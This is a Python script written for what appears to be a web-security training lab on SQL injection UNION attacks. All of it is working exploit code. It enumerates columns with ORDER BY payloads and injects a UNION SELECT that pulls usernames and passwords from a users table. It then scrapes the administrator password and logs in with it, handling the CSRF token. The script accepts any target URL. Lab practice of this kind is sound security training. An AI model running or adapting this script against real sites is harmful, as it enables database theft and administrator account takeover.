# Lab: SQL injection UNION attack, retrieving data from other tables

import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

def numbberof_column(url):
    path="/filter?category=Gifts"
    for i in range(1,50):
        payload_str="'+order+by+{}+--".format(i)
        res = requests.get(url+path+payload_str,proxies=proxy,verify=False)
        if "Internal Server Error" in res.text:
            return i-1
    return False   #in case unable to find number of columns

def str_datatype_columns(url,ncolumn):
    path="/filter?category=Gifts"
    for i in range(1,ncolumn+1):
        listof_column=[]
        payload_list=['null']*ncolumn
        payload_list[i-1]="'A'"
        payload="'+union+select+"+"+,".join(payload_list)+"+--"
        res = requests.get(url+path+payload,proxies=proxy,verify=False)
        if "Internal Server Error" not in res.text:
            listof_column.append(i)
    return listof_column

def pass_finder(url):
    path = "/filter?category=Gifts"
    payload = "'+union+select+username,+password+from+users+--"
    res = requests.get(url+path+payload,proxies=proxy,verify=False)
    if "administrator" in res.text:
        print("[+] Administartor Found happy happy")
        soup = BeautifulSoup(res.text,'html.parser')
        admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
        return admin_password    
    
def admin_login(url,administrator_password):
    path="/login"
    s=requests.session()
    resfor_csrf=s.get(url+path,proxies=proxy,verify=False)
    soup = BeautifulSoup(resfor_csrf.text,"html.parser")
    csrf = soup.find("input")["value"]
    data = {
        "csrf":csrf,
        "username":"administrator",
        "password":administrator_password
    }
    res = s.post(url+path,data=data,proxies=proxy,verify=False)
    if res.status_code == 200:
        return True

if __name__=="__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[+] Usage : python3 {} <url>".format(sys.argv[0]))
        print("[+] Example : python3 {} www.example.com".format(sys.argv[0]))

    print("[+] Figuring Number of Columns....")
    ncolumn = numbberof_column(url)
    if ncolumn:
        print("[+] Number of Columns = {}".format(ncolumn))
        print("[+] Figuring string datatype column....")
        lcolumn=str_datatype_columns(url,ncolumn)
        if lcolumn:
            print("[+] Number of string column {}".format(lcolumn))
        else:
            print("[-] Unable to find datatype")
        administrator_password = pass_finder(url)
        if (admin_login(url,administrator_password)):
            print("\n********** Successfully logged in as Administrator ***********\n")

        # admin_login(url,administrator_password)
